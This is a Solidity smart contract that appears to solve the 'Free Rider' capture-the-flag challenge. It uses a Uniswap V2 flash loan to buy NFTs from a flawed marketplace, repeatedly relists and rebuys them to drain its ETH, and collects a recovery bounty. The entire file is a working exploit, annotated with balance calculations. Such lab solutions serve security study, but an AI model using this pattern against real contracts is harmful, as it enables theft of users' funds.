// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "hardhat/console.sol";
import "solmate/src/tokens/ERC20.sol";
import "solmate/src/tokens/WETH.sol";
import { FreeRiderRecovery } from './FreeRiderRecovery.sol';
import { FreeRiderNFTMarketplace } from './FreeRiderNFTMarketplace.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    address immutable uniswapPair;
    address immutable freeRiderRecovery;
    address immutable freeRiderNFTMarketplace;
    address immutable owner;
    address nft;

    constructor(
        address _owner, 
        address _uniswapPair, 
        address _freeRiderRecovery, 
        address _freeRiderNFTMarketplace
    ) {
        uniswapPair = _uniswapPair;
        freeRiderRecovery = _freeRiderRecovery;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        owner = _owner;
    }

    function startAttack(uint amount0Out, uint amount1Out, address to, bytes calldata data) external{
        //start the flash loan
        IUniswapV2Pair(uniswapPair).swap(
            amount0Out,
            amount1Out,
            to,
            data
        );
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // console.log('----------------------start: ', amount0, amount1);
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        require(msg.sender == uniswapPair, "Invalid sender"); // ensure that msg.sender is a V2 pair
        nft = address(FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).token());
        // console.log('----------------------uniswapV2: ', token0, amount0);

        //unwrap WETH back to ETH, loan 1000 ETH
        WETH(payable(token0)).withdraw(amount0);

        console.log('----------------------start buy NFT: ', address(this).balance / 10 ** 18);
        buyNft();
        console.log('----------------------end buy NFT: ', address(this).balance / 10 ** 18);

        //send NFT to receiver
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            IERC721(nft).safeTransferFrom(address(this), freeRiderRecovery, tokenId, abi.encode(address(this)));
        }

        uint256 amountRequired = amount0 + ((amount0 * 3 / 997) + 1);
        WETH(payable(token0)).deposit{value: amountRequired}();

        console.log('----------------------transfer back: ', amountRequired);
        require(WETH(payable(token0)).transfer(msg.sender, amountRequired), "transfer failed"); // return tokens to V2 pair

        //send remining balance to player
        payable(owner).transfer(address(this).balance);
    }

    function buyNft() internal{
        uint256[] memory tokenIds = new uint256[](3);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        //use the ETH to buy all NFT
        FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).buyMany{value: 15 ether}(tokenIds);
        //right now, Marketplace has 90 + 15 - 15 * 3 = 60 ether
        // we have 45 - 15 = 30 ether

        //we have 3 NFT
        //we need to drain the 90 ETH
        uint256[] memory prices = new uint256[](3);
        prices[0] = 30 ether;
        prices[1] = 30 ether;
        prices[2] = 30 ether;
        IERC721(nft).setApprovalForAll(freeRiderNFTMarketplace, true);
        FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).offerMany(tokenIds, prices);
        FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).buyMany{value: 30 ether}(tokenIds);

        //right now, Marketplace has 60 + 30 - 30 * 3 = 0
        // we have 30 - 30 + 30 * 3 ether = 90 ether

        tokenIds = new uint256[](3);
        tokenIds[0] = 3;
        tokenIds[1] = 4;
        tokenIds[2] = 5;
        FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).buyMany{value: 45 ether}(tokenIds);
        //right now, Marketplace has 0
        // we have 90 - 45 = 45
    }

    // needs to accept ETH from any V1 exchange and WETH. ideally this could be enforced, as in the router,
    // but it's not possible because it requires a call to the v1 factory, which takes too much gas
    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
